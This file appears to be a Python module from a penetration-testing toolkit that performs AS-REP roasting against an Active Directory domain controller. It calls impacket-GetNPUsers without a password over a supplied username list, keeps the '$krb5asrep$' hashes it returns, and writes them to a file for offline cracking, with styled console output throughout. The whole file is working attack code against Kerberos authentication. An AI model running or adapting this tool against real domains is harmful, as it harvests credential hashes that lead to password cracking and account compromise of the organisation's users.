def run(data, cred, args):
    import subprocess
    from pathlib import Path

    # --- CORE PALETTE ---
    G, C, B, Y, W, R = '\033[92m', '\033[96m', '\033[94m', '\033[93m', '\033[0m', '\033[91m'
    BOLD, DIM = '\033[1m', '\033[2m'

    # ---------------- HELPERS ----------------
    def require_file(val, name):
        if not val:
            print(f"\n{R}[!] {W}{BOLD}MISSING ARGUMENT{W}")
            print(f"{B}  └── {B}Option:{W} --{name}")
            return None
        path = Path(val).expanduser().resolve()
        if not path.exists():
            print(f"\n{R}[!] {W}{BOLD}FILE NOT FOUND{W}")
            print(f"{B}  └── {B}Path:{W} {path}")
            return None
        return path

    # ---------------- INPUT ----------------
    users = require_file(args.file, "file")
    if not users: return

    output_path = args.out or "asrep_hashes.txt"
    output = Path(output_path).expanduser().resolve()

    # ---------------- EXECUTION HUD ----------------
    domain = data.get('domain', 'local')
    dc_ip  = data.get('ip', '0.0.0.0')
    
    print(f"\n{B}┌── {BOLD}MODULE: AS-REP ROAST{W}{B} ─────────────────────────────────┐{W}")
    print(f"{B}│{W}  {B}{'Target:':<12}{W} {C}{domain}{W} {B}@{W} {C}{dc_ip:<21}{W} {B}│{W}")
    print(f"{B}│{W}  {B}{'Wordlist:':<12}{W} {W}{users.name:<34}{W} {B}│{W}")
    print(f"{B}└──────────────────────────────────────────────────────────┘{W}")

    # Build Command
    cmd = [
        "impacket-GetNPUsers", 
        f"{domain}/", 
        "-no-pass", 
        "-usersfile", str(users), 
        "-dc-ip", dc_ip
    ]

    print(f"\n{B}[{W}{G}*{W}{B}]{W} {DIM}Invoking Impacket GetNPUsers...{W}")

    # ---------------- SUBPROCESS ----------------
    result = subprocess.run(cmd, capture_output=True, text=True)

    if result.stderr and "Getting" not in result.stderr:
        print(f"{R}[!] STDERR:{W}\n{result.stderr}")

    # ---------------- PARSE & WRITE ----------------
    hashes = [line for line in result.stdout.splitlines() if "$krb5asrep$" in line]

    if not hashes:
        print(f"{Y}[!] {W}No accounts found with 'Do not require Kerberos preauthentication' set.\n")
        return

    # Write hashes to disk
    output.write_text("\n".join(hashes) + "\n")

    # ---------------- SUCCESS HUD ----------------
    print(f"{B}  └── {G}{BOLD}SUCCESS{W}")
    print(f"{B}      ├── {B}Hashes Found:{W} {G}{len(hashes)}{W}")
    print(f"{B}      └── {B}Output File:{W}  {Y}{output}{W}\n")
    